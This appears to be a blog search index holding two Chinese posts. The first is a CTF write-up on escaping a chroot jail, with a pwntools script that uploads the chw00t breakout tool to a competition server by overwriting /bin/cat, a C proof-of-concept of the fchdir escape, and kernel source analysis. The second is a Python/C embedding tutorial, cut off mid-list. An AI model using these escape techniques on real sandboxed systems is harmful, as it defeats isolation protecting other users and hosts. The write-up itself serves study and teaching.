<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>chroot jailbreak</title>
    <url>/year/08/29/cl7iordp7001v293f1sx2f2n5/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近网鼎杯青龙组做到了一道chroot逃逸的题目，正好整理一下它逃逸的原理。</p>
<a id="more"></a>

<h2 id="0x01-逃逸利用"><a href="#0x01-逃逸利用" class="headerlink" title="0x01 逃逸利用"></a>0x01 逃逸利用</h2><p>通常来说，chroot一般有两个含义，chroot(1)是/usr/bin/chroot, chroot(2)是glibc中的一个函数。</p>
<blockquote>
<p>chroot(1)<br>chroot - run command or interactive shell with special root directory<br>chroot [OPTION] NEWROOT [COMMAND [ARG]…]</p>
</blockquote>
<blockquote>
<p>chroot(2)<br>chroot - change root directory<br>int chroot(const char *path);</p>
</blockquote>
<p>chroot主要的功能是改变根目录，之前是在ctf出题时会将/home/ctf目录chroot成为根目录，实现与我们docker的文件系统隔离，提供一个安全的靶场环境。在模拟运行固件的时候，也经常会将当前文件系统的目录chroot为根目录，这样才能找到固件所需库的路径。</p>
<p>但chroot是一个不安全的feature，容易被逃逸出来，这里有一个逃逸用的[工具](<a href="https://github.com/earthquake/chw00t" target="_blank" rel="noopener">earthquake/chw00t: chw00t - Unices chroot breaking tool (github.com)</a>)</p>
<p>里面也包含了一些逃逸常用的方法</p>
<h3 id="网鼎杯青龙组exp"><a href="#网鼎杯青龙组exp" class="headerlink" title="网鼎杯青龙组exp"></a>网鼎杯青龙组exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./chw00t'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    binary = fd.read() </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> binary:</span><br><span class="line">    payload += <span class="string">'\\x'</span> + hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.system('echo -e "' + payload + '"' + '&gt; ./exp')</span></span><br><span class="line"><span class="comment"># flag = False </span></span><br><span class="line"></span><br><span class="line">first_command = <span class="string">'echo -ne "&#123;&#125;" &gt; /bin/cat'</span></span><br><span class="line">after_command = <span class="string">'echo -ne "&#123;&#125;" &gt;&gt; /bin/cat'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(payload, command)</span>:</span></span><br><span class="line">    sh = remote(<span class="string">'123.57.26.28'</span>, <span class="number">31379</span>)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">'get the shell, and then?'</span>, command.format(payload))</span><br><span class="line">    <span class="comment"># sleep(0.5)</span></span><br><span class="line">    sh.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = len(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, size, <span class="number">0x1000</span>):</span><br><span class="line">    data = payload[i:i+<span class="number">0x1000</span>]</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        write(data, first_command)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        write(data, after_command)</span><br></pre></td></tr></table></figure>

<h2 id="0x02-chroot实现"><a href="#0x02-chroot实现" class="headerlink" title="0x02 chroot实现"></a>0x02 chroot实现</h2><h3 id="keys-chroot源码"><a href="#keys-chroot源码" class="headerlink" title="keys_chroot源码"></a>keys_chroot源码</h3><p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/fs/open.c#L506" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/fs/open.c#L506</a></p>
<p>chroot运行在内核，会调用系统函数ksys_chroot函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ksys_chroot</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> __user *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">path</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> lookup_flags = LOOKUP_FOLLOW | LOOKUP_DIRECTORY;</span><br><span class="line">retry:</span><br><span class="line">    <span class="comment">// 根据文件名找到 path 结构</span></span><br><span class="line">	error = user_path_at(AT_FDCWD, filename, lookup_flags, &amp;path);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 path 的 mm_root dentry 结构，再解析相应的 inode 结构，即 d_inode，就可找到挂载点相应的 inode 结构</span></span><br><span class="line">	error = inode_permission(path.dentry-&gt;d_inode, MAY_EXEC | MAY_CHDIR);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> dput_and_out;</span><br><span class="line"></span><br><span class="line">	error = -EPERM;</span><br><span class="line">    <span class="comment">// 判断当前进程所有者是不是有执行 chroot 操作的权限</span></span><br><span class="line">    <span class="comment">// 这里是 namespace, cred 的内容了，不展开</span></span><br><span class="line">	<span class="keyword">if</span> (!ns_capable(current_user_ns(), CAP_SYS_CHROOT))</span><br><span class="line">		<span class="keyword">goto</span> dput_and_out;</span><br><span class="line">	error = security_path_chroot(&amp;path);</span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">goto</span> dput_and_out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主要操作就是这个函数</span></span><br><span class="line">	set_fs_root(current-&gt;fs, &amp;path);</span><br><span class="line">	error = <span class="number">0</span>;</span><br><span class="line">dput_and_out:</span><br><span class="line">	path_put(&amp;path);</span><br><span class="line">	<span class="keyword">if</span> (retry_estale(error, lookup_flags)) &#123;</span><br><span class="line">		lookup_flags |= LOOKUP_REVAL;</span><br><span class="line">		<span class="keyword">goto</span> retry;</span><br><span class="line">	&#125;</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="set-fs-root"><a href="#set-fs-root" class="headerlink" title="set_fs_root"></a>set_fs_root</h3><p>主要函数，就是在这个函数里修改了程序的 “根目录”</p>
<p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/fs/fs_struct.c#L15" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/fs/fs_struct.c#L15</a></p>
<p>先来看一下 fs_struct</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> users;</span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;</span><br><span class="line">	<span class="keyword">seqcount_t</span> seq;</span><br><span class="line">	<span class="keyword">int</span> umask;</span><br><span class="line">	<span class="keyword">int</span> in_exec;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">root</span>, <span class="title">pwd</span>;</span> </span><br><span class="line">    <span class="comment">// root：根目录的目录项</span></span><br><span class="line">	 <span class="comment">// pwd：当前工作目录的目录项</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Replace the fs-&gt;&#123;rootmnt,root&#125; with &#123;mnt,dentry&#125;. Put the old values.</span></span><br><span class="line"><span class="comment"> * It can block.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_fs_root</span><span class="params">(struct fs_struct *fs, <span class="keyword">const</span> struct path *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">old_root</span>;</span></span><br><span class="line"></span><br><span class="line">	path_get(path);</span><br><span class="line">	spin_lock(&amp;fs-&gt;lock); <span class="comment">// 自旋锁</span></span><br><span class="line">	write_seqcount_begin(&amp;fs-&gt;seq);</span><br><span class="line">	old_root = fs-&gt;root; <span class="comment">// 保存程序的 根目录 的目录项</span></span><br><span class="line">	fs-&gt;root = *path; <span class="comment">// 设置 根目录 为 path 的目录项</span></span><br><span class="line">	write_seqcount_end(&amp;fs-&gt;seq);</span><br><span class="line">	spin_unlock(&amp;fs-&gt;lock);</span><br><span class="line">	<span class="keyword">if</span> (old_root.dentry)</span><br><span class="line">		path_put(&amp;old_root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="struct-path"><a href="#struct-path" class="headerlink" title="struct path"></a>struct path</h3><p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/include/linux/path.h#L8" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/include/linux/path.h#L8</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">path</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<h3 id="struct-vfsmount"><a href="#struct-vfsmount" class="headerlink" title="struct vfsmount"></a>struct vfsmount</h3><p>描述独立文件系统的挂载信息，每个不同的挂载点对应一个独立的 <code>vfsmount</code> 结构，属于同一文件系统的所有目录和文件隶属同一 <code>vfsmount</code> 该 <code>vfsmount</code> 结构对应于该文件系统顶层目录，即挂载目录</p>
<p>via: <a href="https://elixir.bootlin.com/linux/v5.6/source/include/linux/mount.h#L68" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/include/linux/mount.h#L68</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">mnt_root</span>;</span>	<span class="comment">/* 上一层挂载点对应的 dentry */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">mnt_sb</span>;</span>	<span class="comment">/* 指向超级块 */</span></span><br><span class="line">	<span class="keyword">int</span> mnt_flags;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>### </p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实 chroot 修改了进程的 root 目录的核心操作就是修改了 进程 的 <code>task_struct -&gt; fs -&gt; root</code></p>
<p>通过文件名去解析 文件夹 对应的<code>path</code>    结构，存在<code>patch</code>    变量里面，然后权限检查，再然后把<code>path</code>    传进<code>set_fs_root</code>    函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fs-&gt;root = *path;</span><br></pre></td></tr></table></figure>

<p>修改了root，这样进程就认为 <code>filename</code> 是根目录，因为 <code>fs-&gt;root</code> 存的是 <code>filename</code> 目录的 <code>path</code> 结构</p>
<p>但我们可以发现，它只改变了<code>root</code>，但是没有改变<code>cwd</code></p>
<h2 id="chroot-jailbreak-原理分析"><a href="#chroot-jailbreak-原理分析" class="headerlink" title="chroot jailbreak 原理分析"></a>chroot jailbreak 原理分析</h2><p>根据上文源码可以发现，我们只改变了<code>root</code>，但是没有改变<code>cwd</code></p>
<ul>
<li><code>chroot()</code>不改变工作目录。因此通常在调用<code>chroot()</code>之后会紧跟<code>chdir(&quot;/&quot;)</code>，把工作目录设定到新的root；否则仍可使用工作目录访问jail外的文件。只是之后访问jail外的文件不可以用绝对路径了，因为root目录还在jail里。</li>
<li>可以使用jail外文件的文件描述符脱离jail，使用<code>fchdir()</code>即可改变工作目录到jail外。如果是特权进程的话(精确地，指拥有<code>CAP_SYS_CHROOT</code>权限)，还可以在<code>fchdir()</code>后使用<code>chroot(&quot;.&quot;)</code>以把root目录设置到jail外。倘若多<code>chdir(&quot;..&quot;)</code>几次，可以回到原先的root目录。</li>
<li>Unix domain socket提供了进程间传递文件描述符的方法。限定在chroot jail内的进程可以从外部获取文件描述符，之后即可<code>fchdir()</code>使工作目录脱离jail。</li>
</ul>
<p>下面是一个例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">"."</span>, O_RDONLY), i; <span class="comment">// jail外的文件描述符，供之后脱离</span></span><br><span class="line">  mkdir(<span class="string">"tempdir"</span>, <span class="number">0755</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (chroot(<span class="string">"tempdir"</span>) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// chroot</span></span><br><span class="line">  <span class="keyword">if</span> (fchdir(fd) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 脱离</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) <span class="comment">// 回到原先的root目录。这里不能使用绝对路径`/`，只能逐步上移</span></span><br><span class="line">      chdir(<span class="string">".."</span>);</span><br><span class="line">  <span class="keyword">if</span> (chroot(<span class="string">"."</span>) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 若是特权进程，则可进一步，把root设回去；不是的话也足以访问jail外的文件</span></span><br><span class="line">  system(<span class="string">"ls"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/10/15/sandbox/" target="_blank" rel="noopener">清华校赛THUCTF2019 之 固若金汤 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p><a href="https://atum.li/2017/04/25/linuxsandbox/#chroot-jail" target="_blank" rel="noopener">linux中的容器与沙箱初探 — Atum</a></p>
<p><a href="http://maskray.me/blog/2011-08-16-break-out-of-chroot" target="_blank" rel="noopener">脱离chroot的枷锁 | MaskRay</a></p>
]]></content>
      <tags>
        <tag>chroot</tag>
        <tag>逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>在C/C++中调用python代码</title>
    <url>/year/08/04/cl7iordqq005x293fopje8s6m/</url>
    <content><![CDATA[<p>最近使用C++实现了一个fuzz。但是发现对应目标有认证流程，我的fuzz代码上也得加上这个加密认证逻辑才能正常工作。经过谷哥的帮助，在网上找到了一段python实现的加密认证逻辑。</p>
<p>让我自己用C++重写？那是不可能的，于是就走上了用C++调用python的踩坑之路。</p>
<a id="more"></a>

<h2 id="0x01-执行简单Python代码"><a href="#0x01-执行简单Python代码" class="headerlink" title="0x01 执行简单Python代码"></a>0x01 执行简单Python代码</h2><p>如果我们应用的场景并不复杂，比如知识想执行一段简单的python代码。那么你只需要了解以下内容</p>
<ol>
<li>在头文件中包含Python.h头文件</li>
<li>使用<code>Py_Initialize()</code> 初始化python解析器</li>
<li>使用<code>PyRun_SimpleString</code>执行python代码</li>
<li><code>Py_Finalize</code> 释放python解析器</li>
</ol>
<p>以下就是一个实现的demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Python.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Py_Initialize();    ##初始化  </span><br><span class="line">    PyRun_SimpleString(<span class="string">"print('hello')"</span>);</span><br><span class="line">    Py_Finalize();      ##释放资源    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意在链接的时候加上对应的库，编译指令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g++ test.cpp -I/usr/include/python3.8 -l python3.8</span><br></pre></td></tr></table></figure>

<h2 id="0x02-执行简单python脚本中的函数"><a href="#0x02-执行简单python脚本中的函数" class="headerlink" title="0x02 执行简单python脚本中的函数"></a>0x02 执行简单python脚本中的函数</h2><h3 id="2-1-无参数与返回值"><a href="#2-1-无参数与返回值" class="headerlink" title="2.1 无参数与返回值"></a>2.1 无参数与返回值</h3><p>有的时候我们需要调用python脚本中的函数来实现一些功能，假设这个时候我们有这样一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat script/sayHello.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"hello"</span>)</span><br></pre></td></tr></table></figure>

<p>然后我们需要了解一些常用api</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//导入函数相关</span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyModule_GetDict</span><span class="params">( PyObject *<span class="keyword">module</span>)</span></span></span><br><span class="line"><span class="function">    <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">    PyModule_GetDict()函数可以获得Python模块中的函数列表。PyModule_GetDict()函数返回一个字典。字典中的关键字为函数名，值为函数的调用地址。</span></span></span><br><span class="line"><span class="function"><span class="comment">字典里面的值可以通过PyDict_GetItemString()函数来获取，其中p是PyModule_GetDict()的字典，而key则是对应的函数名</span></span></span><br><span class="line"><span class="function"><span class="comment">*/</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyObject_GetAttrString</span><span class="params">(PyObject *o, <span class="keyword">char</span> *attr_name)</span></span></span><br><span class="line"><span class="function">  <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">     PyObject_GetAttrString()返回模块对象中的attr_name属性或函数，相当于Python中表达式语句：o.attr_name</span></span></span><br><span class="line"><span class="function"><span class="comment">     */</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//调用函数相关</span></span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyObject_CallObject</span><span class="params">( PyObject *callable_object, PyObject *args)</span></span></span><br><span class="line"><span class="function">PyObject* <span class="title">PyObject_CallFunction</span><span class="params">( PyObject *callable_object, <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line"><span class="function">  <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">    使用上面两个函数可以在C程序中调用Python中的函数。callable_object为要调用的函数对象，也就是通过上述导入函数得到的函数对象，</span></span></span><br><span class="line"><span class="function"><span class="comment">而区别在于前者使用python的tuple来传参，后者则使用类似c语言printf的风格进行传参。</span></span></span><br><span class="line"><span class="function"><span class="comment">如果不需要参数，那么args可能为NULL。返回成功时调用的结果，或失败时返回NULL。</span></span></span><br><span class="line"><span class="function"><span class="comment">这相当于Python表达式 apply(callable_object, args) 或 callable_object(*args)</span></span></span><br><span class="line"><span class="function"><span class="comment">*/</span></span></span><br></pre></td></tr></table></figure>

<p>我们可以像下面这样去加载调用模块，并调用指定的函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;python2.7/Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Py_Initialize();</span><br><span class="line">	<span class="keyword">if</span>( !Py_IsInitialized())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"python init fail"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	PyRun_SimpleString(<span class="string">"import sys"</span>);</span><br><span class="line">	PyRun_SimpleString(<span class="string">"sys.path.append('./script')"</span>);</span><br><span class="line"></span><br><span class="line">	PyObject* pModule = PyImport_ImportModule(<span class="string">"sayHello"</span>);</span><br><span class="line">	<span class="keyword">if</span>( pModule == <span class="literal">NULL</span> )&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt;<span class="string">"module not found"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PyObject* pFunc = PyObject_GetAttrString(pModule, <span class="string">"say"</span>);</span><br><span class="line">	<span class="keyword">if</span>( !pFunc || !PyCallable_Check(pFunc))&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt;<span class="string">"not found function add_num"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	 PyObject_CallObject(pFunc, <span class="literal">NULL</span> );</span><br><span class="line"></span><br><span class="line">	Py_Finalize();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2有参数与返回值"><a href="#2-2有参数与返回值" class="headerlink" title="2.2有参数与返回值"></a>2.2有参数与返回值</h3><h4 id="参数构建"><a href="#参数构建" class="headerlink" title="参数构建"></a>参数构建</h4><p>在Python/C API中提供了Py_BuildValue()函数对数字和字符串进行转换处理，使之变成Python中相应的数据类型。其函数原型如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PyObject* <span class="title">Py_BuildValue</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line"><span class="function">  <span class="comment">/*</span></span></span><br><span class="line"><span class="function"><span class="comment">    Py_BuildValue()提供了类似c语言printf的参数构造方法，format是要构造的参数的类型列表，函数中剩余的参数即要转换的C语言中的整型、浮点型或者字符串等。</span></span></span><br><span class="line"><span class="function"><span class="comment">其返回值为PyObject型的指针。</span></span></span><br><span class="line"><span class="function"><span class="comment">*/</span></span></span><br></pre></td></tr></table></figure>

<p>format对应的类型列表如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">s(str或None)[<span class="keyword">char</span> *]</span><br><span class="line">使用'utf-8'编码将以null结尾的C字符串转换为Python str对象。如果C字符串指针为NULL，则表示None。</span><br><span class="line"></span><br><span class="line">s＃(str或None)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">使用'utf-8'编码将C字符串及其长度转换为Python str对象。如果C字符串指针为NULL，则忽略长度返回None。</span><br><span class="line"></span><br><span class="line">y(字节)[<span class="keyword">char</span> *]</span><br><span class="line">这会将C字符串转换为Python字节对象。如果C字符串指针为<span class="literal">NULL</span>，则返回None。</span><br><span class="line"></span><br><span class="line">y＃(字节)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">这会将C字符串及其长度转换为Python对象。如果C字符串指针为<span class="literal">NULL</span>，则返回None。</span><br><span class="line"></span><br><span class="line">z(str或None)[<span class="keyword">char</span> *]</span><br><span class="line">与s相同。</span><br><span class="line"></span><br><span class="line">z＃(str或None)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">与s＃相同。</span><br><span class="line"></span><br><span class="line">u(str)[Py_UNICODE *]</span><br><span class="line">将Unicode(UCS<span class="number">-2</span>或UCS<span class="number">-4</span>)数据的以null结尾的缓冲区转换为Python Unicode对象。如果Unicode缓冲区指针为<span class="literal">NULL</span>，则返回None。</span><br><span class="line"></span><br><span class="line">u＃(str)[Py_UNICODE *，<span class="keyword">int</span>]</span><br><span class="line">将Unicode(UCS<span class="number">-2</span>或UCS<span class="number">-4</span>)数据缓冲区及其长度转换为Python Unicode对象。如果Unicode缓冲区指针为<span class="literal">NULL</span>，则忽略长度并返回None。</span><br><span class="line"></span><br><span class="line">U(str或None)[<span class="keyword">char</span> *]</span><br><span class="line">与s相同。</span><br><span class="line"></span><br><span class="line">U＃(str或None)[<span class="keyword">char</span> *，<span class="keyword">int</span>]</span><br><span class="line">与s＃相同。</span><br><span class="line"></span><br><span class="line">i(<span class="keyword">int</span>)[<span class="keyword">int</span>]</span><br><span class="line">将普通的C <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">b(<span class="keyword">int</span>)[<span class="keyword">char</span>]</span><br><span class="line">将纯C <span class="keyword">char</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">h(<span class="keyword">int</span>)[short <span class="keyword">int</span>]</span><br><span class="line">将普通的C short <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">l(<span class="keyword">int</span>)[<span class="keyword">long</span> <span class="keyword">int</span>]</span><br><span class="line">将C <span class="keyword">long</span> <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">B(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">char</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">char</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">H(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> short <span class="keyword">int</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> short <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">I(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">int</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">int</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">k(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">long</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">long</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">L(<span class="keyword">int</span>)[<span class="keyword">long</span> <span class="keyword">long</span>]</span><br><span class="line">将C <span class="keyword">long</span> <span class="keyword">long</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">K(<span class="keyword">int</span>)[<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>]</span><br><span class="line">将C <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>转换为Python整数对象。</span><br><span class="line"></span><br><span class="line">n(<span class="keyword">int</span>)[Py_ssize_t]</span><br><span class="line">将C Py_ssize_t转换为Python整数。</span><br><span class="line"></span><br><span class="line">c(长度为<span class="number">1</span>的字节)[<span class="keyword">char</span>]</span><br><span class="line">将表示字节的C <span class="keyword">int</span>转换为长度为<span class="number">1</span>的Python字节对象。</span><br><span class="line"></span><br><span class="line">C(长度为<span class="number">1</span>的str)[<span class="keyword">int</span>]</span><br><span class="line">将表示字符的C <span class="keyword">int</span>转换为长度为<span class="number">1</span>的Python str对象。</span><br><span class="line"></span><br><span class="line">d(<span class="keyword">float</span>) [<span class="keyword">double</span>] </span><br><span class="line">将C <span class="keyword">double</span>转换为Python浮点数。</span><br><span class="line"></span><br><span class="line">f(<span class="keyword">float</span>) [<span class="keyword">float</span>] </span><br><span class="line">将C <span class="keyword">float</span>转换为Python浮点数。</span><br><span class="line"></span><br><span class="line">D(<span class="built_in">complex</span>) [Py_complex *]</span><br><span class="line">将C Py_complex结构转换为Python复数。</span><br><span class="line"></span><br><span class="line">O(object) [PyObject *]</span><br><span class="line">不改变Python对象的传递(引用计数除外，它增加<span class="number">1</span>)。如果传入的对象是<span class="literal">NULL</span>指针，则假定这是因为产生参数的调用发现错误并设置了异常。</span><br><span class="line">因此，Py_BuildValue()将返回<span class="literal">NULL</span>但不会引发异常。如果尚未引发异常，则设置SystemError。</span><br><span class="line"></span><br><span class="line">S(object) [PyObject *]</span><br><span class="line">与O相同</span><br><span class="line"></span><br><span class="line">N((object) [PyObject *]</span><br><span class="line">与O相同，但不会增加对象的引用计数。通过调用参数列表中的对象构造函数创建对象时很有用。</span><br><span class="line"></span><br><span class="line">O＆(object) [converter, anything] </span><br><span class="line">通过转换器函数将任何内容转换为Python对象。该函数被调用任何东西(应与<span 